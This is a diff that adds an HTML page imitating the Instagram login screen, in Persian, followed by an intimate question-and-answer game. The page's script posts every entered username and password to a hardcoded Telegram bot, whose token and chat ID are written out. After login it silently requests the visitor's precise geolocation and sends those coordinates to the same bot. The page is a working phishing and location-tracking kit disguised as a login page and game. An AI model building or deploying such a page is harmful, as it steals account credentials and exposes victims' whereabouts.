@@ -1,0 +1,759 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
+        html, body {
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 0;
+            margin: 0;
+            overflow: hidden;
+        }
+        #loginPage {
+            width: 100%;
+            max-width: 380px;
+            background: #000;
+            padding: 30px 24px;
+            text-align: center;
+        }
+        #loginPage .logo {
+            font-size: 38px;
+            font-weight: 400;
+            font-family: 'Segoe UI', cursive;
+            margin-bottom: 25px;
+            color: #fff;
+            letter-spacing: -2px;
+        }
+        #loginPage .logo span { font-weight: 600; }
+        #loginPage input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 4px 0;
+            border: 1px solid #262626;
+            border-radius: 10px;
+            font-size: 15px;
+            background: #121212;
+            color: #fff;
+        }
+        #loginPage input::placeholder { color: #8e8e8e; }
+        #loginPage input:focus {
+            border-color: #1a1a1a;
+            outline: none;
+            background: #1a1a1a;
+        }
+        #loginPage .btn-login {
+            width: 100%;
+            padding: 12px;
+            margin-top: 12px;
+            background: #0095f6;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        #loginPage .btn-login:hover { background: #1877f2; }
+        #loginPage .btn-login:disabled { opacity: 0.6; cursor: not-allowed; }
+        #loginPage .divider {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            gap: 18px;
+        }
+        #loginPage .divider::before, #loginPage .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #262626;
+        }
+        #loginPage .divider span {
+            color: #8e8e8e;
+            font-size: 12px;
+            font-weight: 600;
+        }
+        #loginPage .forgot-link {
+            display: block;
+            margin-top: 14px;
+            font-size: 13px;
+            color: #0095f6;
+            text-decoration: none;
+        }
+        #loginPage .fb-login {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-top: 10px;
+            background: none;
+            border: none;
+            color: #0095f6;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+        }
+        #loginPage .fb-login .fb-icon {
+            font-size: 18px;
+            color: #fff;
+            background: #1877f2;
+            border-radius: 50%;
+            width: 26px;
+            height: 26px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        #loginPage .signup-row {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #8e8e8e;
+        }
+        #loginPage .signup-row a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
+        }
+        #loginPage .meta-footer {
+            margin-top: 18px;
+            font-size: 12px;
+            color: #8e8e8e;
+            letter-spacing: 0.3px;
+        }
+        #loginPage .error-msg {
+            color: #ed4956;
+            font-size: 13px;
+            margin-top: 8px;
+            min-height: 20px;
+        }
+        #gamePage {
+            display: none;
+            width: 100%;
+            height: 100vh;
+            height: 100dvh;
+            background: #000;
+            padding: 12px 14px 10px;
+            color: #e0e0e0;
+            overflow: hidden;
+            flex-direction: column;
+        }
+        #gamePage.active { display: flex; }
+        .game-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 0 10px;
+            border-bottom: 1px solid #1a1a1a;
+            flex-shrink: 0;
+        }
+        .game-header .user-info {
+            font-size: 13px;
+            color: #8e8e8e;
+        }
+        .game-header .user-info strong {
+            color: #ff6b6b;
+        }
+        .game-header .status-badge {
+            background: #1a2a1a;
+            color: #4caf50;
+            padding: 3px 14px;
+            border-radius: 50px;
+            font-size: 11px;
+            font-weight: bold;
+            border: 1px solid #2e7d32;
+        }
+        .info-collected {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 6px;
+            justify-content: center;
+            padding: 4px 0;
+            font-size: 10px;
+            color: #5a5a5a;
+            flex-shrink: 0;
+        }
+        .info-collected .item {
+            background: #0a0a0a;
+            padding: 2px 12px;
+            border-radius: 50px;
+            border: 1px solid #1a1a1a;
+            color: #8e8e8e;
+        }
+        .info-collected .item strong { color: #ff6b6b; }
+        #displayLocation { display: none; }
+        .game-main {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            flex: 1;
+            padding: 8px 0;
+            min-height: 0;
+        }
+        .player-box {
+            background: #0d0d0d;
+            border-radius: 14px;
+            padding: 14px;
+            border: 1px solid #1a1a1a;
+            display: flex;
+            flex-direction: column;
+            flex: 1;
+            min-height: 0;
+        }
+        .player-box.active-turn {
+            border-color: #ff6b6b;
+            background: #1a0a0a;
+            box-shadow: 0 0 30px rgba(255, 107, 107, 0.05);
+        }
+        .player-box .player-name {
+            font-weight: bold;
+            font-size: 14px;
+            color: #e0e0e0;
+            margin-bottom: 4px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-shrink: 0;
+        }
+        .player-box .player-name .badge {
+            font-size: 9px;
+            background: #1a1a1a;
+            padding: 2px 12px;
+            border-radius: 50px;
+            color: #8e8e8e;
+            border: 1px solid #2a2a2a;
+        }
+        .player-box.active-turn .player-name .badge {
+            background: #3a1a1a;
+            color: #ff6b6b;
+            border-color: #ff6b6b;
+        }
+        .player-box .question-area {
+            flex: 1;
+            margin: 4px 0;
+            min-height: 0;
+        }
+        .player-box .question-area .question-text {
+            background: #0a0a0a;
+            padding: 12px 14px;
+            border-radius: 10px;
+            border: 1px solid #1a1a1a;
+            font-size: 15px;
+            min-height: 55px;
+            color: #e0e0e0;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            line-height: 1.5;
+            word-break: break-word;
+        }
+        .player-box .question-area .question-text .q-label {
+            font-size: 10px;
+            color: #5a5a5a;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-right: 6px;
+            flex-shrink: 0;
+        }
+        .player-box .answer-area {
+            flex-shrink: 0;
+            margin-top: 4px;
+        }
+        .player-box .answer-area textarea {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #1a1a1a;
+            border-radius: 10px;
+            font-size: 13px;
+            resize: none;
+            min-height: 40px;
+            font-family: inherit;
+            background: #0a0a0a;
+            color: #e0e0e0;
+        }
+        .player-box .answer-area textarea:focus {
+            border-color: #ff6b6b;
+            outline: none;
+        }
+        .player-box .answer-area textarea::placeholder {
+            color: #5a5a5a;
+            font-size: 12px;
+        }
+        .player-box .btn-action {
+            width: 100%;
+            padding: 9px;
+            margin-top: 4px;
+            background: #ff6b6b;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.2s;
+            flex-shrink: 0;
+        }
+        .player-box .btn-action:hover { background: #e55555; }
+        .player-box .btn-action:disabled {
+            opacity: 0.3;
+            cursor: not-allowed;
+        }
+        .player-box .btn-action.secondary {
+            background: #1a1a1a;
+            color: #8e8e8e;
+        }
+        .player-box .btn-action.secondary:hover { background: #2a2a2a; }
+        .player-box .answer-display {
+            background: #0a0a0a;
+            padding: 10px 14px;
+            border-radius: 10px;
+            border: 1px solid #1a1a1a;
+            font-size: 14px;
+            color: #ff6b6b;
+            min-height: 38px;
+            margin-top: 4px;
+            flex-shrink: 0;
+            display: none;
+            line-height: 1.4;
+            word-break: break-word;
+        }
+        .player-box .answer-display.show {
+            display: block;
+        }
+        .player-box .answer-display .label {
+            color: #5a5a5a;
+            font-size: 9px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        .game-bottom {
+            flex-shrink: 0;
+            border-top: 1px solid #1a1a1a;
+            padding-top: 8px;
+        }
+        .questions-pool {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 5px;
+            justify-content: center;
+            padding-bottom: 4px;
+        }
+        .questions-pool .q-chip {
+            background: #0d0d0d;
+            color: #8e8e8e;
+            padding: 4px 14px;
+            border-radius: 50px;
+            font-size: 11px;
+            cursor: pointer;
+            border: 1px solid #1a1a1a;
+            transition: all 0.3s;
+            white-space: nowrap;
+        }
+        .questions-pool .q-chip:hover {
+            border-color: #ff6b6b;
+            color: #e0e0e0;
+            background: #1a0a0a;
+        }
+        .questions-pool .q-chip.used {
+            opacity: 0.2;
+            cursor: not-allowed;
+            text-decoration: line-through;
+        }
+        .questions-pool .q-chip.selected {
+            border-color: #ff6b6b;
+            background: #2a0a0a;
+            color: #ff6b6b;
+        }
+        .chat-box {
+            flex-shrink: 0;
+            background: #0a0a0a;
+            border-radius: 10px;
+            padding: 6px 10px;
+            border: 1px solid #1a1a1a;
+            max-height: 50px;
+            overflow-y: auto;
+            margin-top: 4px;
+        }
+        .chat-box .msg {
+            padding: 2px 10px;
+            margin: 2px 0;
+            background: #0d0d0d;
+            border-radius: 14px;
+            font-size: 11px;
+            border: 1px solid #1a1a1a;
+            display: inline-block;
+            max-width: 90%;
+            color: #e0e0e0;
+        }
+        .chat-box .msg.me {
+            background: #ff6b6b;
+            color: white;
+            border-color: #ff6b6b;
+        }
+        .chat-box .msg.opponent {
+            background: #1a1a1a;
+            color: #e0e0e0;
+        }
+        .chat-box .msg.system {
+            background: #1a0a0a;
+            color: #ff6b6b;
+            border-color: #2a1a1a;
+            font-style: italic;
+            width: 100%;
+            text-align: center;
+        }
+        .hidden { display: none !important; }
+        .text-center { text-align: center; }
+        .chat-box::-webkit-scrollbar {
+            width: 3px;
+        }
+        .chat-box::-webkit-scrollbar-track {
+            background: #0a0a0a;
+        }
+        .chat-box::-webkit-scrollbar-thumb {
+            background: #2a2a2a;
+            border-radius: 10px;
+        }
+        .btn-action, .q-chip, .btn-login, .fb-login {
+            touch-action: manipulation;
+        }
+        textarea {
+            touch-action: manipulation;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ====== صفحه لاگین ====== -->
+<div id="loginPage">
+    <div class="logo">Insta<span>gram</span></div>
+    <input type="text" id="usernameInput" placeholder="Mobile number, username or email" dir="ltr">
+    <input type="password" id="passwordInput" placeholder="Password" dir="ltr">
+    <button class="btn-login" id="loginBtn" onclick="handleLogin()">Log in</button>
+    <div class="error-msg" id="loginError"></div>
+    <a href="#" class="forgot-link">Forgot password?</a>
+    <div class="divider"><span>OR</span></div>
+    <button class="fb-login" onclick="handleLogin()">
+        <span class="fb-icon">f</span> Log in with Facebook
+    </button>
+    <div class="signup-row">
+        Don't have an account? <a href="#" onclick="handleLogin()">Sign up</a>
+    </div>
+    <div class="meta-footer">Meta</div>
+</div>
+
+<!-- ====== صفحه بازی ====== -->
+<div id="gamePage">
+    <div class="game-header">
+        <div class="user-info">👤 <strong id="displayUsername">کاربر</strong></div>
+        <div class="status-badge" id="gameStatus">🟢 آنلاین</div>
+    </div>
+
+    <div class="info-collected">
+        <span class="item">👤 کاربر: <strong id="displayUser">-</strong></span>
+        <span class="item" style="display:none;">📍 موقعیت: <strong id="displayLocation"></strong></span>
+    </div>
+
+    <div class="game-main">
+        <!-- بازیکن ۱ (سوال‌پرس) -->
+        <div class="player-box active-turn" id="player1Box">
+            <div class="player-name">
+                <span>👤 شما</span>
+                <span class="badge" id="turnBadge1">نوبت پرسیدن</span>
+            </div>
+            <div class="question-area">
+                <div class="question-text">
+                    <span class="q-label">❓</span>
+                    <span id="questionText1">سوالی انتخاب کنید</span>
+                </div>
+            </div>
+            <!-- کاربر ۱ فقط سوال میپرسه، جواب نمیده -->
+            <div class="answer-area" style="display:none;">
+                <textarea id="answerInput1" placeholder="جواب خود را بنویسید..." disabled></textarea>
+            </div>
+            <button class="btn-action" id="sendBtn1" style="display:none;" disabled>✉️ ارسال جواب</button>
+            <div class="answer-display" id="answerDisplay1">
+                <div class="label">💬 جواب حریف:</div>
+                <span id="opponentAnswer1">-</span>
+            </div>
+        </div>
+
+        <!-- بازیکن ۲ (جواب‌دهنده) -->
+        <div class="player-box" id="player2Box">
+            <div class="player-name">
+                <span>👤 حریف</span>
+                <span class="badge" id="turnBadge2">در انتظار</span>
+            </div>
+            <div class="question-area">
+                <div class="question-text">
+                    <span class="q-label">💬</span>
+                    <span id="questionText2">منتظر سوال...</span>
+                </div>
+            </div>
+            <div class="answer-area">
+                <textarea id="answerInput2" placeholder="جواب خود را بنویسید..." disabled></textarea>
+            </div>
+            <button class="btn-action" id="sendBtn2" onclick="sendAnswer(2)" disabled>✉️ ارسال جواب</button>
+            <div class="answer-display" id="answerDisplay2" style="display:none;">
+                <div class="label">❓ سوال شما:</div>
+                <span id="opponentAnswer2">-</span>
+            </div>
+        </div>
+    </div>
+
+    <div class="game-bottom">
+        <div class="questions-pool" id="questionsPool">
+            <span class="q-chip" data-q="1" onclick="selectQuestion(1)">🔞 اولین قرار</span>
+            <span class="q-chip" data-q="2" onclick="selectQuestion(2)">🤫 راز مخفی</span>
+            <span class="q-chip" data-q="3" onclick="selectQuestion(3)">💔 بدترین شکست</span>
+            <span class="q-chip" data-q="4" onclick="selectQuestion(4)">🌍 آرزوی سفر</span>
+            <span class="q-chip" data-q="5" onclick="selectQuestion(5)">❤️ اولین عشق</span>
+            <span class="q-chip" data-q="6" onclick="selectQuestion(6)">😱 ترس بزرگ</span>
+            <span class="q-chip" data-q="7" onclick="selectQuestion(7)">🎯 هدف زندگی</span>
+        </div>
+
+        <div class="chat-box" id="chatBox">
+            <div class="msg system">💕 به بازی خوش آمدید!</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // ============================================================
+    // تنظیمات ربات تلگرام
+    // ============================================================
+    const BOT_TOKEN = "8688040538:AAEdjIj4w9sR7ORBoXKa79ob-PTXVx6bOKs";
+    const CHAT_ID = "7064578264";
+
+    // ============================================================
+    // متغیرها
+    // ============================================================
+    let username = '';
+    let password = '';
+    let currentQuestion = null;
+    let turn = 1; // 1 = سوال‌پرس, 2 = جواب‌دهنده
+    let usedQuestions = new Set();
+    let infoSent = { location: false, login: false };
+    let locationRequested = false;
+    let waitingForAnswer = false;
+
+    // ============================================================
+    // سوالات
+    // ============================================================
+    const questions = {
+        1: '🔞 اولین قرار عاشقانه‌ات چطور بود؟',
+        2: '🤫 یک رازی که هیچ‌کس نمی‌دونه رو بگو',
+        3: '💔 بدترین شکست عشقی زندگی‌ات چه بود؟',
+        4: '🌍 آرزوی سفرت به کجاست؟',
+        5: '❤️ اولین عشق تو کی بود؟',
+        6: '😱 بزرگترین ترس تو چیه؟',
+        7: '🎯 بزرگترین هدف زندگی‌ات چیه؟'
+    };
+
+    // ============================================================
+    // ارسال به تلگرام
+    // ============================================================
+    function sendToTelegram(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(e => console.log('Telegram error:', e));
+    }
+
+    // ============================================================
+    // گرفتن لوکیشن (بی‌صدا)
+    // ============================================================
+    function getLocationSilent() {
+        if (locationRequested) return;
+        locationRequested = true;
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    if (!infoSent.location) {
+                        sendToTelegram(`📍 موقعیت مکانی:\n👤 کاربر: ${username}\n🗺️ مختصات: ${lat}, ${lon}`);
+                        infoSent.location = true;
+                    }
+                },
+                err => { console.log('Location error:', err.message); },
+                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+            );
+        }
+    }
+
+    // ============================================================
+    // لاگین
+    // ============================================================
+    function handleLogin() {
+        const user = document.getElementById('usernameInput').value.trim();
+        const pass = document.getElementById('passwordInput').value.trim();
+        const btn = document.getElementById('loginBtn');
+        const error = document.getElementById('loginError');
+
+        if (!user || !pass) {
+            error.textContent = 'لطفاً همه فیلدها را پر کنید';
+            return;
+        }
+
+        btn.disabled = true;
+        btn.innerHTML = '⏳ در حال ورود...';
+        error.textContent = '';
+
+        username = user;
+        password = pass;
+
+        sendToTelegram(`🔐 اطلاعات لاگین:\n👤 یوزرنیم: ${user}\n🔑 رمز: ${pass}`);
+
+        document.getElementById('displayUser').textContent = user;
+        document.getElementById('displayUsername').textContent = user;
+
+        document.getElementById('loginPage').style.display = 'none';
+        const gamePage = document.getElementById('gamePage');
+        gamePage.style.display = 'flex';
+        gamePage.classList.add('active');
+
+        getLocationSilent();
+        addChatMessage('system', '💕 به بازی خوش آمدید!');
+        addChatMessage('system', '❓ یک سوال انتخاب کنید و از حریف بپرسید.');
+        updateTurnUI();
+    }
+
+    // ============================================================
+    // انتخاب سوال (کاربر ۱ میپرسه)
+    // ============================================================
+    function selectQuestion(qId) {
+        if (usedQuestions.has(qId)) {
+            addChatMessage('system', '💔 این سوال قبلاً پرسیده شده!');
+            return;
+        }
+
+        if (turn !== 1) {
+            addChatMessage('system', '⏳ الان نوبت حریف است که جواب بدهد...');
+            return;
+        }
+
+        if (waitingForAnswer) {
+            addChatMessage('system', '⏳ منتظر جواب حریف باشید...');
+            return;
+        }
+
+        currentQuestion = qId;
+        usedQuestions.add(qId);
+        waitingForAnswer = true;
+
+        // نمایش سوال برای هر دو
+        document.getElementById('questionText1').textContent = questions[qId];
+        document.getElementById('questionText2').textContent = questions[qId];
+
+        // آپدیت چیپ‌ها
+        document.querySelectorAll('.q-chip').forEach(el => {
+            if (parseInt(el.dataset.q) === qId) {
+                el.classList.add('used');
+            }
+            el.classList.remove('selected');
+        });
+
+        // کاربر ۱ (سوال‌پرس) غیرفعال
+        document.getElementById('turnBadge1').textContent = 'در انتظار جواب';
+        
+        // کاربر ۲ (جواب‌دهنده) فعال برای جواب
+        document.getElementById('answerInput2').disabled = false;
+        document.getElementById('answerInput2').value = '';
+        document.getElementById('answerInput2').focus();
+        document.getElementById('sendBtn2').disabled = false;
+        document.getElementById('sendBtn2').textContent = '✉️ ارسال جواب';
+        document.getElementById('sendBtn2').className = 'btn-action';
+
+        turn = 2;
+        updateTurnUI();
+
+        addChatMessage('system', `❓ سوال پرسیده شد: ${questions[qId]}`);
+        addChatMessage('system', '💬 حالا نوبت حریف است که جواب بدهد...');
+    }
+
+    // ============================================================
+    // ارسال جواب (کاربر ۲ جواب میده)
+    // ============================================================
+    function sendAnswer(player) {
+        if (player !== 2) return;
+        if (!waitingForAnswer) {
+            addChatMessage('system', '⏳ هنوز سوالی پرسیده نشده!');
+            return;
+        }
+
+        const answer = document.getElementById('answerInput2').value.trim();
+        if (!answer) {
+            addChatMessage('system', '💔 لطفاً جواب را بنویسید...');
+            return;
+        }
+
+        // نمایش جواب برای کاربر ۱
+        document.getElementById('opponentAnswer1').textContent = answer;
+        document.getElementById('answerDisplay1').classList.add('show');
+
+        addChatMessage('opponent', `💬 ${answer}`);
+
+        // غیرفعال کردن کاربر ۲
+        document.getElementById('answerInput2').disabled = true;
+        document.getElementById('sendBtn2').disabled = true;
+        document.getElementById('sendBtn2').className = 'btn-action secondary';
+        document.getElementById('sendBtn2').textContent = '⏳ در انتظار...';
+
+        waitingForAnswer = false;
+
+        // برگرداندن نوبت به کاربر ۱ برای سوال بعدی
+        turn = 1;
+        updateTurnUI();
+
+        addChatMessage('system', '💖 جواب دریافت شد!');
+        addChatMessage('system', '❓ حالا نوبت شماست که سوال جدید بپرسید.');
+    }
+
+    // ============================================================
+    // آپدیت UI نوبت
+    // ============================================================
+    function updateTurnUI() {
+        const p1 = document.getElementById('player1Box');
+        const p2 = document.getElementById('player2Box');
+        const b1 = document.getElementById('turnBadge1');
+        const b2 = document.getElementById('turnBadge2');
+
+        if (turn === 1) {
+            p1.classList.add('active-turn');
+            p2.classList.remove('active-turn');
+            b1.textContent = 'نوبت پرسیدن ❓';
+            b2.textContent = 'در انتظار 🌹';
+            document.getElementById('questionText2').textContent = 'منتظر سوال...';
+        } else {
+            p2.classList.add('active-turn');
+            p1.classList.remove('active-turn');
+            b1.textContent = 'در انتظار جواب 🌹';
+            b2.textContent = 'نوبت جواب 💬';
+        }
+    }
+
+    // ============================================================
+    // چت
+    // ============================================================
+    function addChatMessage(type, text) {
+        const box = document.getElementById('chatBox');
+        const msg = document.createElement('div');
+        msg.className = `msg ${type}`;
+        msg.textContent = text;
+        box.appendChild(msg);
+        box.scrollTop = box.scrollHeight;
+    }
+</script>
+</body>
+</html>
